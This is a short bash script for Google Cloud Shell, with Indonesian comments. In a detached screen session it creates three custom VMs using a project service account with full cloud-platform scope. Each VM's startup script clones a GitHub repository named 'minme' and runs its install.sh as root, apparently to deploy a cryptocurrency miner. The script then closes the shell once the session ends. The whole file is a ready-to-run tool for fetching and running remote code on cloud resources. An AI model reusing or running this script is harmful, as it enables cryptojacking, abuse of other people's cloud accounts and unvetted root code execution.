screen -dmS deploy_instances bash -c '
acc2=$(date +"%Y%m%d-%H%M%S")
sleep 1
acc3=$(date +"%Y%m%d-%H%M%S")
sleep 1
acc4=$(date +"%Y%m%d-%H%M%S")
service_acc=$(gcloud iam service-accounts list --format="value(email)" | sed -n 2p)
ZONE=$(gcloud compute project-info describe --format="value(commonInstanceMetadata.items[google-compute-default-zone])")
PROJECT_ID=$(gcloud config get-value core/project)
ZONE_REGION=$(echo "$ZONE" | cut -d '''-''' -f 1-2)
gcloud compute instances create dev-instance instance-$acc2 --project=$PROJECT_ID --zone=$ZONE --machine-type=e2-custom-4-2048 --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default --metadata=startup-script='''sudo apt update -y && sudo apt install git -y && sudo apt install screen -y && git clone https://github.com/cvayoyo/minme && cd minme && sudo chmod +x * && sudo ./install.sh''' --maintenance-policy=MIGRATE --provisioning-model=STANDARD --service-account=$service_acc --scopes=https://www.googleapis.com/auth/cloud-platform --tags=http-server --create-disk=auto-delete=yes,boot=yes,device-name=dev-instance,image=projects/debian-cloud/global/images/debian-12-bookworm-v20250709,mode=rw,size=10,type=pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --reservation-affinity=any
gcloud compute instances create instance-$acc3 instance-$acc4 --project=$PROJECT_ID --zone=$ZONE --machine-type=n2d-custom-4-2048 --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default --metadata=startup-script='''sudo apt update -y && sudo apt install git -y && sudo apt install screen -y && git clone https://github.com/cvayoyo/minme && cd minme && sudo chmod +x * && sudo ./install.sh''' --maintenance-policy=MIGRATE --provisioning-model=STANDARD --service-account=$service_acc --scopes=https://www.googleapis.com/auth/cloud-platform --tags=http-server --create-disk=auto-delete=yes,boot=yes,device-name=dev-instance,image=projects/debian-cloud/global/images/debian-12-bookworm-v20250709,mode=rw,size=10,type=pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --reservation-affinity=any
echo "Proses selesai!"
'
# Loop untuk menunggu screen selesai, lalu tutup Cloud Shell
while screen -ls | grep -q deploy_instances; do
  sleep 1
done
exit
